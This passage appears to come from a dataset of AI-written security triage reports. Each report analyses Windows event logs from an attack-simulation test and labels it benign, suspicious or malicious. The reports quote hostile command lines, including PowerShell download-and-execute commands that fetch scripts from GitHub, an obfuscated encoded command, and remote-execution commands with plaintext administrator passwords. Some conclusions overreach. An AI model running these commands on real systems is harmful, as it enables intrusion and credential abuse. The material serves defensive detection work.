  - The user `admin_test` is assigned high-level privileges that include `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, `SeImpersonatePrivilege`, etc. These are significant as they are often required for advanced tasks, including potential malicious activities.
  - Logon events indicate NTLM authentication being used from a machine `DESKTOP-3HL5B2P`, suggesting a remote login. Remote logins should be scrutinized, particularly if uncommon for the environment.

- **Failed Logon Attempts (Event ID 4625)**:
  - Multiple failed login attempts were observed using `WMIC.exe`, indicating potential brute forcing or misuse attempts against the `Administrator` account from the local node ""127.0.0.1"". 
  - The command-line includes exposure of credentials directly (`/user:DOMAIN\Administrator /password:P@ssw0rd1`), suggesting misuse or poor scripting practices, and possibly malicious scripts.

- **Command Execution (Sysmon Event ID 1 and 5)**:
  - Execution of processes like `cmd.exe` with command lines to run `notepad.exe` using `WMIC.exe` under `admin_test` is captured, raising red flags if unscheduled or unauthorized.
  - The command suggests attempts to spawn Notepad using administrative credentials, and the presence of `cmd.exe` lines shows typical behavior in attack methodologies (e.g., lateral movement, execution of external processes).

#### 2. **Indicators of Malicious Activity**:
- **Command Line in Sysmon Log**: 
  - The presence of commands involving `WMIC` with hardcoded credentials is a high indicator of potentially malicious backdoor or rogue administrative usage.
  - Hostnames and network service executions captured could imply normal service uptime, yet the accompanying unauthorized command executions stand out.

#### 3. **Threats/Risks Identified**:
- Unauthorized privileged accesses and potential backdoor openings.
- The leakage of sensitive credentials within scripts or command-line executions.
- Failures in login might indicate a possible brute force attempt or reconnaissance activities aimed at exploiting admin credentials.

#### Resolution and Guidance:
- **Resolution**: **MALICIOUS**
  - The activities and indicators found within the logs provide substantial evidence of potential malicious behavior, specifically in regard to unauthorized access attempts, privilege abuse, and potential backdoor setups.
  
- **Recommended Actions**:
  - Immediately change all exposed credentials, particularly on accounts like the `Administrator` account, and investigate potential exposure.
  - Conduct an in-depth forensic analysis on `SERVER002` to determine the full extent of malicious activity.
  - Monitor and restrict remote accesses and ensure logging and alerting mechanisms are in place for NTLM authentication events.
  - Review security policies for auditing, especially around privilege use and time changes, and enforce strict adherence to authorized time-change procedures.
  - Update security defenses, such as endpoint detection tools, to flag anomalous and potential illicit activities as identified above."
NTFS Alternate Data Stream Access,"Upon analyzing the provided Windows event logs, several key activities and behaviors emerge. My detailed analysis is as follows:

### Key Observations

1. **Repeated Usage of PowerShell**:
   - There are multiple Sysmon events indicating the execution of `powershell.exe`. The commandline argument uses `Add-Content` to create and manipulate Alternate Data Streams (ADS) in the file system, specifically with the text “Write-Host ""Stream Data Executed""”.
   - The use of ADS and `Invoke-Expression` (`iex`) can be indicative of attempts to obfuscate operations or execute hidden commands, a technique commonly associated with malicious behavior.

2. **Administrative Privileges**:
   - The security events (EventID 4672) consistently show the user `SERVER002\\admin_test` with high-level privileges, including `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`. Elevated privileges can potentially be exploited for privilege escalation or unauthorized actions.

3. **Usage of `wevtutil.exe`**:
   - `wevtutil.exe` was executed several times in conjunction with `powershell.exe`. While `wevtutil` is a legitimate tool for managing event logs, frequent usage alongside PowerShell can be concerning, especially if not part of regular operational procedures.

4. **Console Host and WHOAMI Execution**:
   - There are several entries for `whoami.exe` and `conhost.exe`. The context and timing suggest possible exploration or enumeration, potentially for situational awareness within a compromised system.

5. **NTLM Authentication**:
   - The security logs reveal NTLM authentication. While NTLM usage is not inherently malicious, in conjunction with the other behaviors, it might suggest lateral movement or unauthorized access attempts/logins.

### Assessment and Risks

The activities observed in these logs could suggest an advanced user, or potentially an adversary, experimenting with PowerShell and Alternate Data Streams. The commands executed and tools used (e.g., PowerShell, `wevtutil.exe`) are often leveraged in attacks for reconnaissance and to execute payloads stealthily. Coupled with elevated privileges and usage of potentially deprecated NTLM authentication, there is a risk of unauthorized access or exploitation.

### Final Resolution

- **Resolution: SUSPICIOUS**

The presence of PowerShell scripts executed with obfuscation techniques, along with elevated privileges, suggests activities that could be consistent with an attacker trying to gain further access or perform reconnaissance.

### Guidance on How to Proceed

1. **Containment**:
   - Immediately isolate `SERVER002` from the network to prevent potential lateral movement or data exfiltration.

2. **In-depth Investigation**:
   - Conduct a deeper forensic analysis of `SERVER002` to determine the full scope and source of the suspicious activities.
   - Analyze the contents of ADS files and PowerShell scripts executed.

3. **Monitoring and Logging**:
   - Increase monitoring on administrative actions and the use of PowerShell across all servers and endpoints.
   - Implement logging for command-line activities for early detection of similar patterns.

4. **Credential and Access Review**:
   - Review and potentially reset credentials associated with `admin_test`.
   - Audit user permissions to ensure the principle of least privilege is applied effectively.

5. **Firewall and Network Configuration**:
   - Enable strict firewall rules and segment the network to limit exposure and potential communication between compromised and critical systems.

By addressing these key points, the organization can better safeguard against potential security threats exposed by this suspicious activity."
Suspicious Execution via Windows Command Shell,"### Detailed Analysis of Windows Event Logs

1. **Sysmon Logs:**
   - The Sysmon logs primarily involve process creation events (EventID 1) and process termination events (EventID 5). Notable processes include `wevtutil.exe`, `conhost.exe`, `svchost.exe`, `hostname.exe`, and `whoami.exe`.
   - `wevtutil.exe` and `conhost.exe` are being used frequently by the user `SERVER002\admin_test`. The frequent use of `wevtutil.exe`, which is a legitimate Windows command-line utility for managing event logs, might initially appear suspicious due to the high volume, but it is not inherent evidence of malicious activity without the presence of abnormal command-line arguments or context.
   - `hostname.exe` and `whoami.exe` are also executed during this period, which are ordinary commands used to retrieve the system hostname and user information, respectively. Their command lines do not show any suspicious activity.
   - The only slightly unusual activity is the presence of a `cmd.exe` command that outputs a message to `hello.txt` using an echo command—a low-risk activity unless connected to a specific threat or request from malware (like living-off-the-land bin (LoLBins) usage).
   - `svchost.exe` and `sppsvc.exe` show activity, both common system processes, executed by `NT AUTHORITY\SYSTEM` or `NETWORK SERVICE`, typical service accounts.

2. **Security Logs:**
   - Time adjustment activities (EventID 4616) are conducted by `LOCAL SERVICE` related to the Service Host (`svchost.exe`). These are regular operations associated with time synchronization and maintenance.

3. **System Logs:**
   - Time changes are confirmed, as mentioned in the security logs, likely relating to time synchronization, which is routine.

4. **Application Logs:**
   - The `edgeupdate` service start and stop events are logged, which correlate with Microsoft Edge updates. This activity is standard for automatic application updates via system services.

5. **Overall Observation:**
   - The logs mostly show typical system and maintenance operations, including activities by system processes for time synchronization and Microsoft Edge updates, which do not indicate malicious activity. The potential oddity includes the use of `cmd.exe`, but without any additional suspicious context or abnormalities, it doesn’t inherently suggest malicious activity.

### Final Assessment:

- **Resolution: BENIGN**

The logs analyzed exhibit normal system and application operations without definitive signs of compromise or malicious activity. Routine processes such as service management, system updates, and time synchronization dominate the log entries, offering no clear evidence of malicious behavior requiring further immediate investigation. The potential insight into the use of `cmd.exe` should remain noted for future context, but does not justify elevation at this time based solely on the provided information."
SOAPHound - Build Cache,"Upon reviewing the provided logs, I identified several key elements worth discussing in terms of suspicious or potentially malicious activity.

### Detailed Analysis:
1. **Time Synchronization Events:**
   - Observed multiple time synchronization events occurring within a short timeframe in the System log. This could be indicative of an intentional manipulation of system time, which adversaries might use to mask their activities or manipulate time-stamped logs.
   - Specifically, events with `EventID 24`, `EventID 1` are related to time change by `svchost.exe`.

2. **Use of Administrative Tools:**
   - The use of `wevtutil.exe` and `conhost.exe` multiple times logged in Sysmon logs, primarily by user `SERVER002\\admin_test`, which seems reasonable given administrative tasks.
   - However, excessive and repeated use of `wevtutil.exe` as seen in Sysmon logs could be part of log tampering efforts.

3. **PowerShell Execution:**
   - Detected execution of a PowerShell script with suspicious parameters: `powershell.exe & {C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.001\bin\script.exe --user $($env:USERNAME)@$($env:USERDOMAIN) --password P@ssword1 --dc 10.0.1.14 --buildcache --cachefilename c:\temp\cache.txt}`.
   - This script execution with hardcoded credentials is highly suspicious. Generally associated with automation scripts, but could suggest credential dumping or lateral movement actions.

4. **Microsoft Edge Update Activity:**
   - Activities related to Microsoft Edge Update logged in Sysmon are expected. However, the sheer volume and frequency of updates being attempted or executed over a short period raise concerns about their legitimacy, especially if no actual Edge update was scheduled or confirmed.

5. **Security Logs:**
   - Events `EventID 4616` in the Security log indicate time changes with `LOCAL SERVICE` as the initiator, consistent with the System log entries.

### Assessment:
- **SUSPICIOUS**: The logs present several signs that can be deemed suspicious, particularly the frequent time synchronization events, excessive administrative command executions, and potentially unauthorized PowerShell script execution. The potential intent could be to obfuscate malicious actions.

### Recommendations:
1. **Investigate Time Changes:**
   - Validate if there was any legitimate reason for frequent time changes. Check for any related system or application updates/activities.

2. **Review Accounts and Permissions:**
   - Check the `SERVER002\\admin_test` account activities for legitimacy. Confirm with the user or IT team about administrative activities performed during the period.

3. **Audit PowerShell Scripts:**
   - Review PowerShell script executions and loaded modules. Confirm they're intended and approved by organizational policy, especially scripts with encoded commands.

4. **Check Update Logs:**
   - Cross-verify the Edge update logs with official records to ensure that no malicious updates were executed.

5. **Conduct a Threat Hunt:**
   - Initiate a focused threat hunting activity based on the behavior patterns observed. These could include lateral movement checks, log tampering attempts, and credential access or dumping.

By following these recommendations, further understanding of the context behind these activities can be gained, and necessary security measures can be taken if malicious activities are further confirmed."
JScript execution to gather local computer information via wscript,"Upon analyzing the provided logs, I've identified some elements that require further investigation. Here is the detailed analysis:

1. **Security Log Analysis:**
   - **EventID 4672** indicates the assignment of special privileges to a process. This is a normal event for SYSTEM processes, which have administrative privileges. However, it's critical to ensure no unauthorized processes are running with these privileges.
   - **EventID 4624** logs successful logons. The repeated logon by SYSTEM using Logon Type 5 (Service) indicates normal service operation.
   - **EventID 4798** involves queries for accounts on the system. This can be normal, but the frequency and account types queried should be checked against expected behavior.

2. **Sysmon Log Analysis:**
   - Processes like `powershell.exe`, `wevtutil.exe`, and `conhost.exe` executed by `SERVER002\admin_test` warrant attention. PowerShell can be used for both legitimate administrative tasks and malicious activities if executed with dangerous scripts or parameters.
   - The presence of numerous executions of `CompatTelRunner.exe`, Microsoft Compatibility Telemetry, indicates diagnostic or telemetry tasks. However, excessive execution, especially in correlation with PowerShell can be suspicious in some scenarios.
   - Launching `HOSTNAME.EXE` could hint towards checking system configuration or environment information, which is typical for both administrative scripts and malicious reconnaissance.

3. **Powershell Log Analysis:**
   - Multiple PowerShell invocations with restricted execution policy hint towards controlled script execution. The script, checking `.inf` files, is likely scanning for certain system configurations, which could be both legitimate or preparation for exploiting known issues.

4. **System Log Analysis:**
   - Numerous `WindowsUpdateClient` entries reflect software updates, which are generally benign unless linked with malicious updates or payloads masquerading as updates.

5. **Application Log Analysis:**
   - The stopping of the `edgeupdate` service could be part of a routine update stop or indicate service manipulation which should be checked for timeline compatibility with authorized actions or potential disruption attempts.

**Key Suspicion Points:**
- Frequent PowerShell and `wevtutil.exe` usage.
- High volume of telemetry and update processes.
- Account enumeration activities.

**Assessment & Recommendation:**
- **Resolution:** **SUSPICIOUS**
- **Recommendation:** Further investigate the context behind PowerShell scripts and their execution. Check system administrator actions during this period to correlate activities. Ensure accounts accessed or queried match expected patterns. Validate Edge and telemetry operations against legitimate software update and diagnostic activities. Utilize security tools to verify integrity of key system binaries and scripts to prevent persistence or manipulation.

Proceed with caution and ensure that security intelligence and endpoint monitoring are updated to detect any continuous or repetitive suspicious behavior."
Create and Execute Batch Script,"Upon analyzing the provided event logs, here's a detailed assessment:

### PowerShell Log Analysis
- **Command Execution**: Multiple events show the execution of a PowerShell command that invokes `Start-Process` with a batch file located at `""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\data.003_script.bat""`. This indicates some form of script execution that could be suspicious.
- **Command Shell Launch**: The use of `Start-Process` to run a batch file within a temp directory structure may suggest an attempt to execute potentially malicious scripts that are often placed in temporary or unusual directories.

### Security Log Analysis
- **Logon Event**: Event ID 4624 indicates a successful logon with Logon Type 5, which is a service logon typically expected on a server system.
- **Privileges Granted**: Event ID 4672 shows that the user `SYSTEM` was granted a series of special privileges, such as `SeDebugPrivilege` and `SeLoadDriverPrivilege`. While normal for the `SYSTEM` account, these privileges can be abused if an attacker gains control over this account.

### Sysmon Log Analysis
- **Process Creation and Image Load**: Multiple events for process creation and image loads involving `powershell.exe`, `cmd.exe`, `MicrosoftEdgeUpdate.exe`, and others are seen. Notably:
  - **PowerShell Execution**: An event shows `powershell.exe` executing with a command line parameter involving `Start-Process` on `data.003_script.bat`.
  - **CMD Execution**: `cmd.exe` is called to run the above batch script, which further confirms its execution.

### Application Log Analysis
- **Microsoft Edge Update**: Most logs here indicate normal update operations for Microsoft Edge Update. This seems to align with typical behavior during software updates but should be monitored to ensure it aligns with legitimate updates.

### Assessment
- **Suspicious Execution**: The execution of a script from a temporary directory through PowerShell indicates potentially malicious activity. Temporary directories and obfuscated paths are often used to bypass defenses and execute malicious scripts.
- **No Clear Malicious Indicator**: Despite the unusual activity, there is no clear evidence within the logs that definitively proves the presence of malware or compromise, such as known malware hashes or connections to known malicious IPs.

### Resolution
**SUSPICIOUS** - While the logs don't explicitly indicate a compromise, the activity observed is suspicious due to the nature and context of execution from temporary folders. Further investigation of `data.003_script.bat` is advised, as well as any network activity associated with these executions. You should also review access logs and scan the system for known vulnerabilities or threats.

### Guidance
- **Investigate `data.003_script.bat`**: Collect and analyze the script to understand its purpose and whether it aligns with typical user activities.
- **Monitor Network Traffic**: Look for any abnormal outbound connections that coincide with these processes.
- **Conduct a Full System Malware Scan**: Use updated antivirus and anti-malware tools to ensure no malicious files are present.
- **Review Privileges and Access Controls**: Ensure that all accounts, especially privileged accounts, have appropriate access levels and have not been compromised."
Execution through API - CreateProcess,"### Detailed Analysis:

The logs provided appear largely normal at first glance, but some activities are suspicious and warrant closer inspection. Here's an analysis of the activities observed in the Sysmon logs:

#### Potentially Suspicious Behavior:
1. **Unusual PowerShell usage:**
   - The execution of `powershell.exe` is a common initial payload for attackers. However, no command-line arguments are visible to reveal its purpose. 
   - This execution by the user `SERVER002\\admin_test` may be benign if a system admin is performing routine tasks, but it should be verified.

2. **Frequent Use of `wevtutil.exe`:**
   - The `wevtutil.exe` tool is used for exporting and clearing Windows event logs. This tool was executed multiple times by the same user `SERVER002\\admin_test`, which could be indicative of log clearing activity often used by attackers to cover their tracks.

3. **Execution of `cmd.exe` to Compile Code:**
   - The command line used with `cmd.exe` involves compiling a `.cs` file with `csc.exe` and executing the output. This script is suspicious unless it is known to be part of expected tasks.
   - Specifically, the command `C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:""%tmp%\data.exe"" /target:exe ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\src\\CreateProcess.cs"" & %%tmp%%/data.exe` executes an executable possibly generated on the fly, which is a typical pattern seen in malicious activities.

4. **Execution of Unknown `data.exe`:**
   - The process `data.exe` built and executed in a temporary directory is highly suspect. It lacks proper versioning and description, indicating a potential custom or malicious payload.
   - The `cmd.exe` command invoking `calc.exe` emerged from `data.exe`. While `calc.exe` itself is benign, the pattern simulates a test often used by attackers to verify successful code execution via unexpected payload delivery methods.

5. **Execution of System Services:**
   - **`WmiPrvSE.exe` and `svchost.exe`:** These are legitimate system processes but should only be seen running under legitimate circumstances. Their appearance with standard execution contexts, such as `NT AUTHORITY\SYSTEM`, generally poses no immediate issue unless seen in conjunction with other anomalous behaviors.

### Assessment:
Based on the Sysmon logs, there is definite unusual activity that may correlate to a possible security incident. The patterns of behavior—such as compiling and executing scripts from temporary directories, frequent `wevtutil.exe` executions, PowerShell execution, and custom executable launches—require further investigation to rule out malicious intent.

### Guidance and Resolution:
1. **VERIFY**: Confirm whether the user `SERVER002\\admin_test` had legitimate reasons for these actions, potentially driven by the role or scheduled tasks.
2. **INVESTIGATE**: Conduct a more thorough review of other logs (including network logs, firewall logs, and SIEM alerts) to correlate these activities with potential threat indicators.
3. **MONITOR**: Continue real-time monitoring of this host for similar patterns and take snapshots of current system states for future comparisons.

### Final Resolution: **SUSPICIOUS**

The activities observed do not definitively confirm a malicious compromise, but they strongly hint towards suspicious behavior that deserves further scrutiny to ensure the environment's integrity."
Run Shellcode via Syscall in Go,"Upon thorough analysis of the provided Windows event logs, I identified some activities worthy of further investigation. Here's the detailed breakdown:

**Suspicious Activities Identified:**

1. **Process Execution with PowerShell:**
   - In the Sysmon logs, there's an execution of `powershell.exe` with a command line invoking `syscall.exe` from a temporary directory, which is unusual:
     ```plaintext
     ""CommandLine"":""\""powershell.exe\"" & {C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\bin\\x64\\syscall.exe -debug}""
     ```

   - This type of behavior, using PowerShell to execute scripts or binaries from temporary directories, is typically associated with suspicious or malware-like activity. The presence of `syscall.exe` suggests potential exploitation or other unauthorized activities aimed at evading detection or executing low-level operations.

2. **Use of System Utility Tools:**
   - The logs show multiple executions of `wevtutil.exe`, `conhost.exe`, and `hostname.exe`. While these are legitimate Windows utilities, their systematic and concurrent execution, as seen in clustered timestamps, might be indicative of attempts to manipulate or interact with event logs or system consoles in a potentially unauthorized manner.

3. **Privilege Context and Integrity Level:**
   - Each of these activities is executed under a high integrity level, suggesting administrative privileges were used. This elevates the risk as it indicates that the user `SERVER002\\admin_test` had suitable access privileges to potentially alter system configurations or execute malicious scripts.

4. **Utility Tools Executed Sequentially:**
   - The consistent pattern of utility executions one after another in a short span of time indicates possible automation, which could be indicative of a script or command sequence being executed to perform certain tasks quickly and without interruption.

**Assessment:**

The behavior outlined above does not conclusively point to a malicious compromise but provides several indicators that are atypical for regular user activity. The use of PowerShell to execute scripts from a temporary directory, especially one not commonly associated with routine operations, combined with administration-level executions of Windows utilities consecutively, suggests a profile consistent with suspicious activity or preparation for an advanced attack like privilege escalation or lateral movement.

**Recommended Actions:**

- **Immediate Investigation:**
  - Examine the content and hash value of `syscall.exe` to assess its source and purpose, possibly returning it to a secure analysis environment for behavioral analysis.
  - Review command history and tasks run by `SERVER002\\admin_test` account to identify any unauthorized changes or misconfigurations.
  - Analyze network traffic patterns around the time these events occurred for any indicator of data exfiltration or communications with known malicious IPs or domains.

- **Enhanced Monitoring:**
  - Increase logging and alert threshold on use of PowerShell especially in combination with scripts run from temporary directories.
  - Implement strict whitelisting for execution of scripts or binaries from temporary or non-standard paths.

- **User Education and Access Management:**
  - Conduct focused security training for administrative users on suspected malicious activity and reinforce the policies on the use of elevated permissions.
  - Review user access permissions and adjust where necessary to ensure the principle of least privilege is adhered to.

**Resolution:**
Given this analysis, the activity contained within the logs is classified as **SUSPICIOUS** and warrants further investigation as outlined above to determine if it could be part of a larger compromise or threat to the network."
Powershell XML requests,"Upon analyzing the provided Windows event logs, here is a detailed breakdown of findings related to the observed activities and events, followed by recommendations and a final resolution:

### Analysis:

1. **Command Execution from Untrusted Sources:**
   - The execution of `cmd.exe` with a PowerShell command including `Invoke-Expression` (IEX) to load a script from an external URL (GitHub) is highly suspicious. This is often used in attack vectors to download and execute malicious scripts remotely.
   - Event Record #17967 shows the command: 
     ```plaintext
     ""cmd.exe"" /c ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -exec bypass -noprofile \""$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('https://raw.githubusercontent.com/file/file-file/master/files/data.001/src/test.xml');$Xml.command.a.execute | IEX\""""
     ```
   - This usage of PowerShell with the `bypass` execution policy and without a profile indicates an attempt to evade detection and execute potentially malicious content.

2. **Use of Administrative Privileges:**
   - Multiple audit events (EventID: 4672) showing admin_test using high-integrity privileges for operations are flagged; this is consistent with actions that may be leveraged to perform harmful tasks.
   - Privileges include `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and `SeImpersonatePrivilege`, which are powerful and can be part of privilege escalation or unauthorized access attempts.

3. **Regular, Non-malicious Activities:**
   - The logs from tools like `hostname.exe`, `whoami.exe`, `conhost.exe`, and `wevtutil.exe` appear normal in isolation but were executed closely together. While benign in appearance, this sequence could be part of unwanted reconnaissance or enumeration.

4. **Network-Based Logon Events:**
   - EventID: 4624 indicates that `admin_test` is logging in via Network Logon (Type 3) which is common in legitimate scenarios but might also be leveraged for lateral movement in a network if compromised credentials are used.

### Assessment:

- **Threat/Risk**: The presence of a script execution from an external source using a potentially malicious PowerShell command indicates a likely compromise or at least a high risk of malicious activity occurring on the host machine. This event could suggest a stage in which external scripts are being used to perform malicious actions or gain further access/control.
- **Indicators of Compromise (IoCs)** include the external script execution from GitHub, the use of `IEX`, and combined high privilege usage.

### Recommendations:

1. **Immediate Actions:**
   - Isolate Server002 from the network to prevent further potential malicious activity and data exfiltration.
   - Conduct a full malware scan of the server, using updated antivirus/antimalware tools.
   - Review other systems in the network for similar activities or connections to the GitHub URL.

2. **Further Investigation:**
   - Analyze the contents of the script fetched from the URL on GitHub to understand its purpose.
   - Review security logs for credential compromises or unauthorized access attempts.
   - Check any data that might have been transferred out during the timeframe of these events.

3. **Long-Term Measures:**
   - Enhance PowerShell logging to capture and alert on IEX or external script commands.
   - Implement stricter network access controls and monitoring, especially for systems with admin-level access.
   - Conduct security awareness training focusing on phishing and executing unverified scripts for all users.

### Final Resolution:

Based on the detailed analysis, the behavior captured in these logs can be deemed **MALICIOUS** due to the execution of a suspicious PowerShell script from an external source that is often used in attack scenarios. Immediate incident response actions are recommended to mitigate potential threats."
WinPwn - Get SYSTEM shell - Pop System Shell using CreateProcess technique,"After reviewing the provided logs, I've carried out a detailed examination to identify any suspicious or potentially malicious activities. Let's break down the analysis based on the different log types:

### Security Logs

1. **Event ID 4616**: This event indicates a change in the system time. The time was moved backward by a couple of seconds on `Server002`. This action could potentially indicate an attempt to manipulate time-stamped logs to cover tracks. However, time changes can also be part of legitimate system updates or NTP synchronizations.

### Application Logs

1. **Microsoft-Windows-Security-SPP (Event ID 16384)**: This event is related to the Software Protection Platform, which ensures software legitimacy. There's nothing immediately suspicious about this event pertaining to licensing or activation processes.

### System Logs

1. **Microsoft-Windows-Kernel-General and Time-Service**: These logs correlate with the change in system time noticed in the security logs. Typically, these are linked to system time changes due to NTP synchronization. The activity detected here doesn't seem overtly suspicious unless combined with other indicators.

### Windows PowerShell Logs

1. **PowerShell Execution**: The `HostApplication` executed PowerShell with the following command:
   ```powershell
   powershell.exe & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script-Techniques/master/CreateProcess/Get-CreateProcessSystem.ps1')}
   ```
   This particular execution seems very suspicious as it's downloading and executing a script from an external GitHub repository. This behavior aligns with known malicious techniques like script-based attacks (commonly seen in malware operations leveraging PowerShell). 

### Sysmon Logs

1. **Process Creations and Network Observations**: There is a pattern of normal system utilities being executed, such as `whoami.exe`, `hostname.exe`, `svchost.exe`, etc. However, the most suspicious activity is related to the `PowerShell` process creation (Process ID 6784) that executes downloaded scripts, which could suggest lateral movement attempts or malicious scripts execution.

### Assessment

The PowerShell activity particularly stands out as a significant potential indicator of compromise. Executing PowerShell scripts from a remote source without stricter authentication or origin checking is often associated with unauthorized access or malware activities.

### Resolution

- **MALICIOUS**: The activity discovered in the PowerShell logs, involving downloading and executing a script from an unverified external source, convincingly indicates a malicious attempt. Immediate response is recommended to contain potential threats.

### Recommendation

1. **Immediate Isolation**: Isolate the affected host (`Server002`) to prevent any potential spread of malicious activity across the network.
   
2. **Analyze the Script**: Download the mentioned PowerShell script from the provided URL in a controlled environment and analyze its behavior.

3. **Forensic Review**: Conduct a deeper forensic review on `Server002` to identify any additional changes or installation of unauthorized tools and backdoors.

4. **Network Monitoring**: Implement network-wide monitoring to identify any similar PowerShell activity or traffic to and from similar unverified sources.

5. **Strengthen Detection Controls**: Enhance PowerShell logging and prohibited script execution policies to prevent such activities in the future."
PowerShell Command Execution,"To analyze these logs, let's break them down into categories and look for any signs of suspicious activity:

### Windows PowerShell Log

PowerShell logs indicate numerous entries utilizing encoded commands (`-e` flag). The decoder for one of the encoded payloads is:

```
JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA==
```

Base64 decoding this string gives:

```
% (gcm ('ie{0}' -f 'x')) ((""Wr""+""it""+""e-Ho""+""st 'H""+""ell""+""o, ""+""fr""+""om P""+""ow""+""erS""+""hel""+""l!'""))
```

The decoded payload reveals an obfuscation technique where the command outputs ""Hello, from PowerShell!"" This technique of using Base64 encoding and obfuscation is a hallmark of malicious activity, as it's frequently used to execute hidden scripts and commands.

### Security Log

The logs primarily show time synchronization events (EventID 4616). There is no indication of privilege escalation or access anomalies in these logs based on the provided entries.

### System Log

The System logs reflect normal operations with time updates and show no particular signs of system-level tampering or anomalies.

### Sysmon Log

Several entries show processes like `wevtutil.exe` and `cmd.exe` linked with the user `SERVER002\\admin_test`. The use of `cmd.exe` to invoke a PowerShell command is further corroborated by the PowerShell log encoding, suggesting a sequence of activity intended to possibly evade detection.

The logs showing:
- **Process:** `cmd.exe` calling `powershell.exe` with encoded commands.
- **User:** `SERVER002\\admin_test`, exhibiting not typical administrative-like behaviors.
- **Level of Integration:** High Integrity Level processes are present showing elevated potential for these commands to be executed with considerable access.

### Conclusions

1. **Suspicious Encoded PowerShell Execution:**
   - The base64-encoded PowerShell commands with a constructed string used to form commands indicate a probable attempt to conceal actual activities.

2. **Chain of Execution:**
   - The utilization of `cmd.exe` to run PowerShell with encoded commands suggests a potential evasion technique.

3. **User Activity:**
   - Given the user context and high integrity level, this activity is unusual and potentially malicious.

### Assessment

Given the above analysis and observed behaviors typical of known tactics to obfuscate and execute malicious actions, this investigation leans towards potentially malicious activities:

- **Resolution:** MALICIOUS

### Guidance on How to Proceed

1. **Immediate Isolation:**
   - Isolate the affected system to prevent potential lateral movement within the network.

2. **Comprehensive Threat Hunt:**
   - Conduct a deeper analysis for any additional encoded scripts or signs of malicious actions across the network and correlated systems.

3. **Forensics and Incident Response:**
   - Collect relevant artifacts for forensic analysis.
   - Verify integrity and security of systems based on identified encoded payload activities.

4. **Strengthen Monitoring and Defenses:**
   - Enhance logging and monitoring of PowerShell (to catch encoded command execution) and other administrative tools usage.
   - Ensure antivirus and endpoint detection solutions are up-to-date with alerts configured for suspicious activities like encoded PowerShell usage.

This assessment concludes that immediate action must be taken to address these potential threats."
Use PsExec to execute a command on a remote host,"Upon reviewing the provided Sysmon logs and associated application logs, I identified several key points that could potentially indicate suspicious or malicious activity:

1. **Multiple Process Executions:**
   - Several instances of ""conhost.exe,"" ""wevtutil.exe,"" and ""powershell.exe"" executing in quick succession. While not inherently malicious, such activity can sometimes indicate process injection or attempts to masquerade as legitimate processes.

2. **Command Line Execution:**
   - The execution of ""cmd.exe"" with a command line: `\""cmd.exe\"" /c \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\script.exe\"" \\\\localhost -u DOMAIN\\Administrator -p P@ssw0rd1 -accepteula \""C:\\Windows\\System32\\calc.exe\""""`. This uses administrator credentials and is running a script from a temporary location, which is highly suspicious, possibly indicating an attempt at unauthorized privilege escalation or execution of a malicious script.

3. **Unauthorized Utility Execution:**
   - The presence of ""wevtutil.exe,"" a Windows utility used to export, archive, and clear event logs, indicates potential tampering or clearing of logs to cover tracks.

4. **Potential Credential Exposure:**
   - The explicit use of administrator credentials in the command line, which is visible in plaintext, is concerning as it could indicate credential exposure.

5. **Windows Update Processes:**
   - Numerous records in the logs are related to Microsoft Edge Update activities. These could be benign, representing legitimate software updates. However, there are instances where execution occurs from unexpected directories like ""C:\\Program Files (x86)\\Microsoft\\Temp\\,"" which could warrant further scrutiny as they can be used to deploy malicious executables disguised as legitimate updates.

In conclusion, the activities observed, particularly with regard to the explicit use of administrator credentials and execution of scripts from temporary directories, elevate the risk level of the logs from purely benign to suspicious. While there are no definitive signs of compromise such as known malicious file hashes or processes with a definite confirmation of being harmful, these actions could potentially indicate an attempt to perform unauthorized operations or compromise security.

### Resolution: SUSPICIOUS
Given the points outlined above, it is recommended to:
- Conduct a deeper investigation of the logs, especially focusing on the origin and purpose of the PowerShell and CMD commands executed.
- Ensure that sensitive information, such as administrator credentials, is not easily accessible and is protected using appropriate security measures.
- Verify the legitimacy of Microsoft Edge Update activities to rule out any tampering or impersonation attempts.
- Monitor the system for any further anomalous behavior or indicators of compromise. 

Promptly addressing these issues can help mitigate any potential threats or security risks."
ATHPowerShellCommandLineParameter -Command parameter variations with encoded arguments,"### Detailed Analysis of Logs

#### Windows PowerShell Logs:
1. **Encoded Commands**: The PowerShell logs indicate the use of `EncodedCommand` via `powershell.exe`; a common tactic employed by attackers to obfuscate their activities. The command line being used:
   ```
   powershell.exe & {Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -CommandParamVariation C -UseEncodedArguments -EncodedArgumentsParamVariation EA -Execute -ErrorAction Stop}
   ```
   While using encoded arguments is not exclusively indicative of malicious activity, it certainly raises suspicion, especially in a server environment.

2. **Command Execution**: The use of PowerShell to iterate through `.inf` files and search for `[defaultinstall.nt(amd64|arm|arm64|x86)]` suggests an attempt to check or potentially manipulate installation entries, which could be indicative of preparatory steps for privilege escalation or tampering with device drivers.

#### System Logs:
1. **Routine Updates and Processes**: The logs mainly show Windows Update-related activity and kernel operations concerning package management. These activities appear benign and consistent with regular system maintenance.

#### Security Logs:
1. **Authentication Events**: The logs show several 5379 events where credential validation failed, with a return code `3221226021`, indicating a potential issue with account logon or authentication processes. While this could potentially be normal, if persistence is seen, further investigation would be necessary as repeated failures could link to bruteforce attempts.

2. **Successful Logon Event (4624)**: This event showing logon type 5 (Service Logon) for SYSTEM seems typical for a server performing routine tasks. The privilege assignment (4672) for SYSTEM includes several privileges that are not unusual for the SYSTEM account, but should be monitored for changes.

